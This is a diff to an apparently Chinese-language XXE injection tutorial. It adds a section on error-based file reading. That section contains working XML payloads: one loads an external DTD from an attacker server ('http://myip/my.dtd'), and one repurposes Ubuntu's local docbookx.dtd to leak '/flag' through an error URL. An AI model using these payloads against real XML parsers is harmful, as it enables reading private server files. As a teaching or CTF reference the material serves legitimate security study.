@@ -44,7 +44,6 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
   <name>&XXE;</name>
 </root>
 ```
-### 0x01回显读取文件
 ### 0x02不带回显读取文件-OOB(Out of Band）   
 >
 OOB XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义和使用的实体，以 %为标志定义，定义和使用方法如下    
@@ -84,6 +83,7 @@ my.dtd放于自己服务器的外部实体：
 ```
 #### Payload2:  
 这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的%编码，第三层就需要在第二层的基础上将所有%、&、’、” html编码    
+ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd 包含%ISOamso       
 ```
 <?xml version="1.0"?>
 <!DOCTYPE message [
@@ -98,6 +98,40 @@ my.dtd放于自己服务器的外部实体：
 ]>
 ```
 
+### 0x03报错回显读取文件-XXE Base Error 
+基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。   
+#### Payload1：    
+my.dtd放于自己服务器的外部实体：   
+```
+<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///re.about/%file;'>">
+%start;
+```
+注入的内容：   
+```
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "http://myip/my.dtd">
+    <!ENTITY % file SYSTEM "file:///flag">
+    %remote;
+    %send;
+]>
+```
+#### Payload2:  
+这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的%编码，第三层就需要在第二层的基础上将所有%、&、’、” html编码    
+ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd 包含%ISOamso       
+```
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % file SYSTEM "file:///flag">
+    <!ENTITY % ISOamso '
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://re.about/?&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;send;
+    '> 
+    %remote;
+]>
+```
 ### Reference
 
 [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)   
